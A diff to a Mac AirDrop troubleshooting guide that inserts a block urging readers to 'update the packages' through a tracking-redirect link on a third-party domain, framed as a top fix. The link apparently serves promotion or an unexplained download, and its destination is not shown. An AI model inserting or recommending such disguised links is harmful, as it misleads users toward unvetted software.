@@ -29,6 +29,15 @@ This guide walks you through every known fix for AirDrop failures on a Mac. Whet
 ---
 
 ## Quick Fix Summary
+---
+
+## One of the most effective ways to resolve this problem is to update the packages.
+
+## [Update the packages](https://track.mymacosx.com/n9LRFD?page=mac_7).
+
+If this solution does not help, please proceed with the steps below.
+
+---
 
 | Fix | Brief Description |
 | --- | --- |
